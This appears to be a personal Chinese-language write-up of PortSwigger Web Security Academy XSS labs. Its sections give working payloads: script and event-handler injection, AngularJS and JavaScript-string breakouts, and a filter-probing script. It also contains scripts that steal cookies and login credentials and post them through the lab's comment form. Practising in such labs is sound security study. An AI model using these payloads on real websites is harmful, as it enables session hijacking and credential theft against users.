---
title: PortSwigger Cross-site scripting
description: PortSwigger Cross-site scripting
---

## Lab: Reflected XSS into HTML context with nothing encoded

| Dimension | Description                                                                                                                                                                                             |
| --------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/cross-site-scripting/reflected#what-is-reflected-cross-site-scripting<br/>https://portswigger.net/web-security/cross-site-scripting/contexts#xss-between-html-tags |
| Lab       | https://portswigger.net/web-security/cross-site-scripting/reflected/lab-html-context-nothing-encoded                                                                                                    |

基礎題，無難度

<!-- prettier-ignore -->
```html
?search=<script>alert(1)</script>
```

## Lab: Stored XSS into HTML context with nothing encoded

| Dimension | Description                                                                                                                                                                                       |
| --------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/cross-site-scripting/stored#what-is-stored-cross-site-scripting<br/>https://portswigger.net/web-security/cross-site-scripting/contexts#xss-between-html-tags |
| Lab       | https://portswigger.net/web-security/cross-site-scripting/stored/lab-html-context-nothing-encoded                                                                                                 |

基礎題，無難度

<!-- prettier-ignore -->
```html
<script>alert(1)</script>
```

## Lab: DOM XSS in `document.write` sink using source `location.search`

| Dimension | Description                                                                                                             |
| --------- | ----------------------------------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/cross-site-scripting/dom-based#exploiting-dom-xss-with-different-sources-and-sinks |
| Lab       | https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink                             |

從來沒用過 [document.write](https://developer.mozilla.org/en-US/docs/Web/API/Document/write)，原來是已經棄用的方法，但可能有機會在老網站看到吧

先觀察網站的 js

<!-- prettier-ignore -->
```js
function trackSearch(query) {
    document.write('<img src="/resources/images/tracker.gif?searchTerms='+query+'">');
}
var query = (new URLSearchParams(window.location.search)).get('search');
if(query) {
    trackSearch(query);
}      
```

payload

<!-- prettier-ignore -->
```html
"/><script>alert(1)</script>
```

注入後會變成

<!-- prettier-ignore -->
```html
<img src="/resources/images/tracker.gif?searchTerms='"/><script>alert(1)</script>'">
```

## Lab: DOM XSS in `innerHTML` sink using source `location.search`

| Dimension | Description                                                                                                             |
| --------- | ----------------------------------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/cross-site-scripting/dom-based#exploiting-dom-xss-with-different-sources-and-sinks |
| Lab       | https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-innerhtml-sink                                  |

先觀察網站的 js 有以下程式碼

<!-- prettier-ignore -->
```js
function doSearchQuery(query) {
    document.getElementById('searchMessage').innerHTML = query;
}
var query = (new URLSearchParams(window.location.search)).get('search');
if(query) {
    doSearchQuery(query);
}
```

插入 `<script>alert(1)</script>` 失敗，不知道是不是瀏覽器的安全機制阻擋

查了一下 [MDN innerHTML](https://developer.mozilla.org/en-US/docs/Web/API/Element/innerHTML#security_considerations)

```
While the property does prevent `<script>` elements from executing when they are injected
```

調整為 `<img src='x' onerror='alert(1)'>` 成功

還不錯，有學到新東西，原來用 `innerHTML` 插入 `<script>` 不會執行程式碼

## Lab: DOM XSS in jQuery anchor `href` attribute sink using `location.search` source

| Dimension | Description                                                                                        |
| --------- | -------------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/cross-site-scripting/dom-based#dom-xss-in-jquery              |
| Lab       | https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-jquery-href-attribute-sink |

基礎題，無難度

<!-- prettier-ignore -->
```
?returnPath=javascript:alert(document.cookie)
```

## Lab: DOM XSS in jQuery selector sink using a hashchange event

| Dimension | Description                                                                                               |
| --------- | --------------------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/cross-site-scripting/dom-based#dom-xss-in-jquery                     |
| Lab       | https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-jquery-selector-hash-change-event |

先觀察網站的 js

<!-- prettier-ignore -->
```js
$(window).on('hashchange', function(){
    var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');
    if (post) post.get(0).scrollIntoView();
});
```

老實說我沒深入研究 jQuery 有哪些 method 可以觸發 XSS，但 jQuery 底層基本上也是調用 DOM API

我們先確認這段程式碼的正常邏輯，如果網址 hash 包含文章標題，就會自動 `scrollIntoView`

<!-- prettier-ignore -->
```
#Spider Web Security
```

先嘗試注入點在哪裡，推測是 jQuery 的 `$`，發現這樣可以成功注入

<!-- prettier-ignore -->
```js
$("<img src='x' onerror='print()'>");
```

之後構造一個假的 Server

```html
<iframe
  src="https://0a51004f0349d85a80bf035d003e002e.web-security-academy.net/#"
  onload="this.src+='<img src=x onerror=print()>'"
></iframe>
```

## Lab: Reflected XSS into attribute with angle brackets HTML-encoded

| Dimension | Description                                                                                                  |
| --------- | ------------------------------------------------------------------------------------------------------------ |
| Document  | https://portswigger.net/web-security/cross-site-scripting/contexts#xss-in-html-tag-attributes                |
| Lab       | https://portswigger.net/web-security/cross-site-scripting/contexts/lab-attribute-angle-brackets-html-encoded |

後來發現注入點在 `<input value="">` 這邊

payload

<!-- prettier-ignore -->
```
123" autofocus onfocus="alert(0)" data-type="456
```

會變成

<!-- prettier-ignore -->
```html
<input value="123" autofocus onfocus="alert(0)" data-type="456" />
```

這次是透過 AI 學到 `autofocus onfocus="alert(0)"` 這個新的方法，主要是因為這個組合比較少用XD

![input-onfocus](../../static/img/input-onfocus.jpg)

## Lab: Stored XSS into anchor `href` attribute with double quotes HTML-encoded

| Dimension | Description                                                                                                      |
| --------- | ---------------------------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/cross-site-scripting/contexts#xss-in-html-tag-attributes                    |
| Lab       | https://portswigger.net/web-security/cross-site-scripting/contexts/lab-href-attribute-double-quotes-html-encoded |

在 website 欄位注入 `javascript:alert(1)`，就會變成

<!-- prettier-ignore -->
```html
<a href="javascript:alert(1)"></a>
```

## Lab: Reflected XSS into a JavaScript string with angle brackets HTML encoded

| Dimension | Description                                                                                                          |
| --------- | -------------------------------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/cross-site-scripting/contexts#breaking-out-of-a-javascript-string               |
| Lab       | https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-angle-brackets-html-encoded |

先觀察網站的 js

<!-- prettier-ignore -->
```js
var searchTerms = '123';
document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
```

題目有給 hint，是要想辦法跳出 js string，payload 如下

<!-- prettier-ignore -->
```js
';alert(1);var a = '3
```

注入後會變成

<!-- prettier-ignore -->
```js
var searchTerms = '';alert(1);var a = '3';
```

## Lab: DOM XSS in `document.write` sink using source `location.search` inside a select element

| Dimension | Description                                                                                                             |
| --------- | ----------------------------------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/cross-site-scripting/dom-based#exploiting-dom-xss-with-different-sources-and-sinks |
| Lab       | https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink-inside-select-element       |

先觀察網站的 js

<!-- prettier-ignore -->
```js
var stores = ["London","Paris","Milan"];
var store = (new URLSearchParams(window.location.search)).get('storeId');
document.write('<select name="storeId">');
if(store) {
    document.write('<option selected>'+store+'</option>');
}
for(var i=0;i<stores.length;i++) {
    if(stores[i] === store) {
        continue;
    }
    document.write('<option>'+stores[i]+'</option>');
}
document.write('</select>');
```

payload

<!-- prettier-ignore -->
```js
encodeURIComponent(`"></select><img src='x' onerror='alert(1)'>`);
```

encode 以後注入到 querystring 的 storeId

<!-- prettier-ignore -->
```
?productId=2&storeId=%22%3E%3C%2Fselect%3E%3Cimg%20src%3D'x'%20onerror%3D'alert(1)'%3E
```

## Lab: DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded

| Dimension | Description                                                                                  |
| --------- | -------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/cross-site-scripting/dom-based#dom-xss-in-angularjs     |
| Lab       | https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-angularjs-expression |

AngularJS 也是我不熟悉的領域 QQ，但我忘記以前在哪裡看過可以注入，成功～

<!-- prettier-ignore -->
```js
{{ constructor.constructor('alert("XSS")')() }}
```

## Lab: Reflected DOM XSS

| Dimension | Description                                                                                                         |
| --------- | ------------------------------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/cross-site-scripting/dom-based#dom-xss-combined-with-reflected-and-stored-data |
| Lab       | https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-dom-xss-reflected                           |

先觀察網站的 js，主要的注入點應該是 `eval`

<!-- prettier-ignore -->
```js
var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
    if (this.readyState == 4 && this.status == 200) {
        eval('var searchResultsObj = ' + this.responseText);
        displaySearchResults(searchResultsObj);
    }
};
xhr.open("GET", path + window.location.search);
xhr.send();
```

試著輸入 `"`，API 回傳的是 `{"results":[],"searchTerm":"\""}`，最終嘗試

<!-- prettier-ignore -->
```
\"};alert(1);//
```

讓整段變成

<!-- prettier-ignore -->
```js
{"results":[],"searchTerm":"\\"};alert(1);//"}
```

## Lab: Stored DOM XSS

| Dimension | Description                                                                                                         |
| --------- | ------------------------------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/cross-site-scripting/dom-based#dom-xss-combined-with-reflected-and-stored-data |
| Lab       | https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-dom-xss-stored                              |

這題算蠻簡單的，嘗試三次就猜出邏輯，連 js 的邏輯都沒看

<!-- prettier-ignore -->
```html
</p><img src="x" onerror="alert(1)">
```

## Lab: Reflected XSS into HTML context with most tags and attributes blocked

| Dimension | Description                                                                                                               |
| --------- | ------------------------------------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/cross-site-scripting/contexts#xss-between-html-tags                                  |
| Lab       | https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-most-tags-and-attributes-blocked |

test payloads

<!-- prettier-ignore -->
```html
<div>123</div> => Tag is not allowed
<div> => Tag is not allowed
```

突破口，可以關閉標籤，接下來要尋找怎麼開啟新的標籤

<!-- prettier-ignore -->
```html
</h1>
```

嘗試 `Tag is not allowed` 的邏輯，推測應該是有黑名單機制

<!-- prettier-ignore -->
```html
<di => bypass
<di> => bypass
<di></di> => bypass
</script> => bypass
alert(1)</script> => bypass
<SCRIPT> => Tag is not allowed
<di><script>alert(1)</di> => Tag is not allowed
<div> => Tag is not allowed
```

偶然發現 `Attribute is not allowed`

<!-- prettier-ignore -->
```html
<di onload="alert(1)"></di> => Attribute is not allowed
<di ONload="alert(1)"></di> => Attribute is not allowed
```

這題最後我實在找不到有啥 tag 跟 attribute 可以注入，於是參考了解答

我發現有 [Cross-site scripting (XSS) cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) 超讚的

其實如果把這邊列出的所有 tags 跟 attributes 都用腳本去測試的話就可以了，不過既然我們已經知道解法，重點只是要學習解題思路，所以最後的答案是

<!-- prettier-ignore -->
```html
<body onresize="print(1)"></body>
```

然後在 exploit-server 的 response body 輸入

<!-- prettier-ignore -->
```html
encodeURIComponent(`<body onresize="print()"></body>`)
// %3Cbody%20onresize%3D%22print()%22%3E%3C%2Fbody%3E
<iframe src="https://0a75006f032f73af803e268000fb00bd.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>
```

## Lab: Reflected XSS into HTML context with all tags blocked except custom ones

| Dimension | Description                                                                                                        |
| --------- | ------------------------------------------------------------------------------------------------------------------ |
| Document  | https://portswigger.net/web-security/cross-site-scripting/contexts#xss-between-html-tags                           |
| Lab       | https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-all-standard-tags-blocked |

這題是有讓我學到新的概念，就是 custom tag 也可以觸發 `on` 事件，另外 [autofocus](https://developer.mozilla.org/en-US/docs/Web/HTML/Reference/Global_attributes/autofocus) 是可以在所有 tag 上的屬性

<!-- prettier-ignore -->
```html
<di onfocus="alert(document.cookie)" tabindex="0" autofocus></di>
```

有了這個觀念，就可以把上面這坨塞到 querystring

<!-- prettier-ignore -->
```js
encodeURIComponent(`<di onfocus="alert(document.cookie)" tabindex=0 autofocus></di>`)
https://0a7c009b044d931980202bbf0062009c.web-security-academy.net/?search=%3Cdi%20onfocus%3D%22alert(document.cookie)%22%20tabindex%3D0%20autofocus%3E%3C%2Fdi%3E
```

之後在 exploit-server 的 response body 輸入

```html
<html>
  <meta
    http-equiv="refresh"
    content="0; url=https://0a7c009b044d931980202bbf0062009c.web-security-academy.net/?search=%3Cdi%20onfocus%3D%22alert(document.cookie)%22%20tabindex%3D0%20autofocus%3E%3C%2Fdi%3E"
  />
</html>
```

使用者點擊 exploit-server 的網址就會轉到 vulnerable 網址，這題不能用 `<iframe>` 是因為 vulnerable 網址有設定 [X-Frame-Options: SAMEORIGIN](../http/iframe-security.md)

## Lab: Reflected XSS with some SVG markup allowed

| Dimension | Description                                                                                    |
| --------- | ---------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/cross-site-scripting/contexts#xss-between-html-tags       |
| Lab       | https://portswigger.net/web-security/cross-site-scripting/contexts/lab-some-svg-markup-allowed |

先用 [Cross-site scripting (XSS) cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) 查詢 `SVG` 支援的 onEvent without user interaction

之後寫一個 js 測試哪些 onEvent 可以通過（被 WAF 擋下來會是 400 Bad Request）

```js
const onEvents = [
  "onafterscriptexecute",
  "onanimationcancel",
  "onanimationend",
  "onanimationiteration",
  "onanimationstart",
  "onbeforeprint",
  "onbeforescriptexecute",
  "onbeforeunload",
  "onbegin",
  "oncanplay",
  "oncanplaythrough",
  "oncontentvisibilityautostatechange",
  "oncontentvisibilityautostatechange(hidden)",
  "oncuechange",
  "ondurationchange",
  "onend",
  "onended",
  "onerror",
  "onfocus",
  "onfocus(autofocus)",
  "onfocusin",
  "onhashchange",
  "onload",
  "onloadeddata",
  "onloadedmetadata",
  "onloadstart",
  "onmessage",
  "onpagereveal",
  "onpageshow",
  "onplay",
  "onplaying",
  "onpopstate",
  "onprogress",
  "onrepeat",
  "onresize",
  "onscroll",
  "onscrollend",
  "onscrollsnapchange",
  "onscrollsnapchanging",
  "onsecuritypolicyviolation",
  "onsuspend",
  "ontimeupdate",
  "ontoggle",
  "ontransitioncancel",
  "ontransitionend",
  "ontransitionrun",
  "ontransitionstart",
  "onunhandledrejection",
  "onunload",
  "onwaiting(loop)",
  "onwebkitanimationend",
  "onwebkitanimationiteration",
  "onwebkitanimationstart",
  "onwebkitplaybacktargetavailabilitychanged",
  "onwebkittransitionend",
];
for (const onEvent of onEvents) {
  fetch(
    `${location.origin}/?search=${encodeURIComponent(`<svg ${onEvent}="alert(1)">`)}`,
  ).then((res) => {
    if (res.status === 200) console.log(onEvent);
  });
}
```

最終結果是 `onbegin`，完全沒用過，查一下 [MDN](https://developer.mozilla.org/en-US/docs/Web/API/SVGAnimationElement/beginEvent_event)

這題我只是單純卡在對 SVG 可用的 Elements 跟 onBegin 不熟，後來直接請 AI 給我 `onbegin` 的範例，最終測出

<!-- prettier-ignore -->
```html
<svg><animateTransform onbegin="alert(1)" attributeName="transform" dur="0.1s" /></svg>
```

## Lab: Reflected XSS in canonical link tag

| Dimension | Description                                                                                   |
| --------- | --------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/cross-site-scripting/contexts#xss-in-html-tag-attributes |
| Lab       | https://portswigger.net/web-security/cross-site-scripting/contexts/lab-canonical-link-tag     |

<!-- todo-yusheng -->

## Lab: Reflected XSS into a JavaScript string with single quote and backslash escaped

| Dimension | Description                                                                                                             |
| --------- | ----------------------------------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/cross-site-scripting/contexts#terminating-the-existing-script                      |
| Lab       | https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-single-quote-backslash-escaped |

這題應該是 [Lab: Reflected XSS into a JavaScript string with angle brackets HTML encoded](#lab-reflected-xss-into-a-javascript-string-with-angle-brackets-html-encoded) 的進階版

先觀察網站的 js

<!-- prettier-ignore -->
```js
var searchTerms = '123';
document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
```

payload

<!-- prettier-ignore -->
```html
</script><img src=1 onerror=alert(document.domain)>
```

## Lab: Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped

| Dimension | Description                                                                                                                                         |
| --------- | --------------------------------------------------------------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/cross-site-scripting/contexts#breaking-out-of-a-javascript-string                                              |
| Lab       | https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-angle-brackets-double-quotes-encoded-single-quotes-escaped |

[breaking-out-of-a-javascript-string](https://portswigger.net/web-security/cross-site-scripting/contexts#breaking-out-of-a-javascript-string) 有給提示

payload

<!-- prettier-ignore -->
```
\';alert(1);//
```

會產生

<!-- prettier-ignore -->
```js
var searchTerms = '\\';alert(1);//';
```

## Lab: Stored XSS into `onclick` event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped

| Dimension | Description                                                                                                                                                    |
| --------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/cross-site-scripting/contexts#making-use-of-html-encoding                                                                 |
| Lab       | https://portswigger.net/web-security/cross-site-scripting/contexts/lab-onclick-event-angle-brackets-double-quotes-html-encoded-single-quotes-backslash-escaped |

在留言的 website 欄位輸入以下 payload

<!-- prettier-ignore -->
```
https://&apos;-alert(document.domain)-&apos;
```

result

<!-- prettier-ignore -->
```html
<a id="author" href="https://'-alert(document.domain)-'" onclick="var tracker={track(){}};tracker.track('https://'-alert(document.domain)-'');">123</a>
```

## Lab: Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped

| Dimension | Description                                                                                                                                                        |
| --------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| Document  | https://portswigger.net/web-security/cross-site-scripting/contexts#xss-in-javascript-template-literals                                                             |
| Lab       | https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-template-literal-angle-brackets-single-double-quotes-backslash-backticks-escaped |

payload

<!-- prettier-ignore -->
```js
${alert(document.domain)}
```

會產生以下

<!-- prettier-ignore -->
```js
var message = `0 search results for '${alert(document.domain)}'`;
```

## Lab: Exploiting cross-site scripting to steal cookies

| Dimension | Description                                                                                                           |
| --------- | --------------------------------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/cross-site-scripting/exploiting#exploiting-cross-site-scripting-to-steal-cookies |
| Lab       | https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-stealing-cookies                             |

這題本來是設計給有買 Burp Suite Professional 的人類，但 hint 有說到，也有方法不需要

我是參考 [這個影片](https://www.youtube.com/watch?v=N_87S9XVy0w) 的解法，概念我都懂，只是為啥我用 postId=2 這篇文章，就沒有受害者瀏覽呢？後來是跟著影片一起用 postId=5，就有成功看到受害者 Po 文

1. 發現 Comment 欄位完全沒有防護，可以直接插入 `<script>`
2. 構造以下 html，讓受害者瀏覽留言時，背後發送一個留言的 API

```html
<script>
  addEventListener("DOMContentLoaded", () => {
    const csrf = document.querySelector("input[name='csrf']").value;
    const cookie = document.cookie;
    fetch(
      "https://0abc008a03bfe38780a1042b00c3002a.web-security-academy.net/post/comment",
      {
        headers: {
          "content-type": "application/x-www-form-urlencoded",
        },
        referrer:
          "https://0abc008a03bfe38780a1042b00c3002a.web-security-academy.net/post?postId=2",
        body: `csrf=${csrf}&postId=5&comment=${cookie}&name=${new Date().getTime()}&email=789%40789&website=`,
        method: "POST",
        mode: "cors",
        credentials: "include",
      },
    );
  });
</script>
```

3. 看到受害者瀏覽留言後，會發送一個留言

<!-- prettier-ignore -->
```
secret=HEta6nCEhiztNlcHwjpE1PimJ3lpxmhJ;
session=RlrBG3zwpRjdyVblTWlne4ILI38vhc4m
```

4. 拿著這組 cookie 去訪問右上角的 `/my-account` 網址，成功解題～

```js
document.cookie = "session=RlrBG3zwpRjdyVblTWlne4ILI38vhc4m";
fetch(
  "https://0abc008a03bfe38780a1042b00c3002a.web-security-academy.net/my-account",
);
```

## Lab: Exploiting cross-site scripting to capture passwords

| Dimension | Description                                                                                                               |
| --------- | ------------------------------------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/cross-site-scripting/exploiting#exploiting-cross-site-scripting-to-capture-passwords |
| Lab       | https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-capturing-passwords                              |

跟上一題的情況一樣，只是現在要改偷登入頁的帳密。這題原本的概念是，要把偷到的帳密送到自己架的 Server，但由於資安考量，PortSwigger 限制只能送到他們架的 Server（要花錢買 Burp Suite Professional），所以我們用比較危險的方式，把偷到的帳密透過留言系統顯示出來

1. 發現 Comment 欄位完全沒有防護，可以直接插入 `<script>`
2. 試試看用 `iframe` 載入登入頁，能不能拿到帳密

```html
<script>
  function onloadIframe() {
    const username = window.frames[0].document.querySelector(
      "input[name='username']",
    ).value;
    const password = window.frames[0].document.querySelector(
      "input[name='password']",
    ).value;
    console.log({ username, password });
  }
</script>
<iframe
  src="https://0a34009004a74700e417261e007f005f.web-security-academy.net/login"
  onload="onloadIframe()"
  style="display:none"
></iframe>
```

3. 把 `console.log` 改成發送留言，拿到的都是 `{"username":"","password":""}`

```html
<script>
  function onloadIframe() {
    const username = window.frames[0].document.querySelector(
      "input[name='username']",
    ).value;
    const password = window.frames[0].document.querySelector(
      "input[name='password']",
    ).value;
    const csrf = document.querySelector("input[name='csrf']").value;
    const cookie = document.cookie;
    fetch(
      "https://0a34009004a74700e417261e007f005f.web-security-academy.net/post/comment",
      {
        headers: {
          "content-type": "application/x-www-form-urlencoded",
        },
        body: `csrf=${csrf}&postId=5&comment=${JSON.stringify({ username, password })}&name=${new Date().toISOString()}&email=789%40789&website=`,
        method: "POST",
        mode: "cors",
        credentials: "include",
      },
    );
  }
</script>
<iframe
  src="https://0a34009004a74700e417261e007f005f.web-security-academy.net/login"
  onload="onloadIframe()"
  style="display:none"
></iframe>
```

4. 加個 `DOMContentLoaded` 試試看，拿到的還是 `{"username":"","password":""}`

```html
<script>
  function onloadIframe() {
    window.frames[0].addEventListener("DOMContentLoaded", () => {
      const username = window.frames[0].document.querySelector(
        "input[name='username']",
      ).value;
      const password = window.frames[0].document.querySelector(
        "input[name='password']",
      ).value;
      const csrf = document.querySelector("input[name='csrf']").value;
      const cookie = document.cookie;
      fetch(
        "https://0a34009004a74700e417261e007f005f.web-security-academy.net/post/comment",
        {
          headers: {
            "content-type": "application/x-www-form-urlencoded",
          },
          body: `csrf=${csrf}&postId=5&comment=${JSON.stringify({ username, password })}&name=${new Date().toISOString()}&email=789%40789&website=`,
          method: "POST",
          mode: "cors",
          credentials: "include",
        },
      );
    });
  }
</script>
<iframe
  src="https://0a34009004a74700e417261e007f005f.web-security-academy.net/login"
  onload="onloadIframe()"
  style="display:none"
></iframe>
```

5. 改成用 `window.open` 試試看，拿到的還是 `{"username":"","password":""}`

```html
<script>
  addEventListener("DOMContentLoaded", () => {
    const loginWindow = window.open(
      "https://0a34009004a74700e417261e007f005f.web-security-academy.net/login",
      "_blank",
    );
    loginWindow.addEventListener("DOMContentLoaded", () => {
      const username = loginWindow.document.querySelector(
        "input[name='username']",
      ).value;
      const password = loginWindow.document.querySelector(
        "input[name='password']",
      ).value;
      const csrf = document.querySelector("input[name='csrf']").value;
      const cookie = document.cookie;
      fetch(
        "https://0a34009004a74700e417261e007f005f.web-security-academy.net/post/comment",
        {
          headers: {
            "content-type": "application/x-www-form-urlencoded",
          },
          body: `csrf=${csrf}&postId=5&comment=${JSON.stringify({ username, password })}&name=${new Date().toISOString()}&email=789%40789&website=`,
          method: "POST",
          mode: "cors",
          credentials: "include",
        },
      );
    });
  });
</script>
```

6. 改成直接注入 `<input>`，成功拿到 `{"username":"administrator","password":"6g7n2wu1j8p490o2iss4"}`

```html
<script>
  function handlePasswordChange() {
    const username = document.querySelector("input[name='username']").value;
    const password = document.querySelector("input[name='password']").value;
    const csrf = document.querySelector("input[name='csrf']").value;
    const cookie = document.cookie;
    fetch(
      "https://0a34009004a74700e417261e007f005f.web-security-academy.net/post/comment",
      {
        headers: {
          "content-type": "application/x-www-form-urlencoded",
        },
        body: `csrf=${csrf}&postId=5&comment=${JSON.stringify({ username, password })}&name=${new Date().toISOString()}&email=789%40789&website=`,
        method: "POST",
        mode: "cors",
        credentials: "include",
      },
    );
  }
</script>
<input type="username" name="username" />
<input type="password" name="password" onchange="handlePasswordChange()" />
```

我覺得我好蠢，想了 `<iframe>` 跟 `window.open` 這兩招，卻沒有想到可以直接插入 `<input>`

但這題的解法，也讓我想要重新認識瀏覽器 autofill 的安全性機制

<!-- todo-yusheng -->

1. 透過 `<iframe>` 開啟的登入頁，會有 autofill 的功能嗎？
2. 透過 `window.open` 開啟的登入頁，會有 autofill 的功能嗎？

## Lab: Exploiting XSS to bypass CSRF defenses

| Dimension | Description                                                                                                                     |
| --------- | ------------------------------------------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/cross-site-scripting/exploiting#exploiting-cross-site-scripting-to-bypass-csrf-protections |
| Lab       | https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-perform-csrf                                           |

## Lab: Reflected XSS with AngularJS sandbox escape without strings

| Dimension | Description                                                                                                                                  |
| --------- | -------------------------------------------------------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/cross-site-scripting/contexts/client-side-template-injection                                            |
| Lab       | https://portswigger.net/web-security/cross-site-scripting/contexts/client-side-template-injection/lab-angular-sandbox-escape-without-strings |

<!-- todo-yusheng -->

## Lab: Reflected XSS with event handlers and `href` attributes blocked

| Dimension | Description                                                                                                       |
| --------- | ----------------------------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/cross-site-scripting/contexts#xss-between-html-tags                          |
| Lab       | https://portswigger.net/web-security/cross-site-scripting/contexts/lab-event-handlers-and-href-attributes-blocked |

<!-- todo-yusheng -->

## Lab: Reflected XSS in a JavaScript URL with some characters blocked

| Dimension | Description                                                                                                   |
| --------- | ------------------------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/cross-site-scripting/contexts#breaking-out-of-a-javascript-string        |
| Lab       | https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-url-some-characters-blocked |

<!-- todo-yusheng -->

## Reflected XSS protected by very strict CSP, with dangling markup attack

| Dimension | Description                                                                                                                                                                                                                        |
| --------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/cross-site-scripting/dangling-markup#what-is-dangling-markup-injection<br/>https://portswigger.net/web-security/cross-site-scripting/content-security-policy#mitigating-xss-attacks-using-csp |
| Lab       | https://portswigger.net/web-security/cross-site-scripting/content-security-policy/lab-very-strict-csp-with-dangling-markup-attack                                                                                                  |

<!-- todo-yusheng -->

## Lab: Reflected XSS protected by CSP, with CSP bypass

| Dimension | Description                                                                                                           |
| --------- | --------------------------------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/cross-site-scripting/content-security-policy#bypassing-csp-with-policy-injection |
| Lab       | https://portswigger.net/web-security/cross-site-scripting/content-security-policy/lab-csp-bypass                      |

<!-- todo-yusheng -->

## 參考資料

- https://portswigger.net/web-security/cross-site-scripting
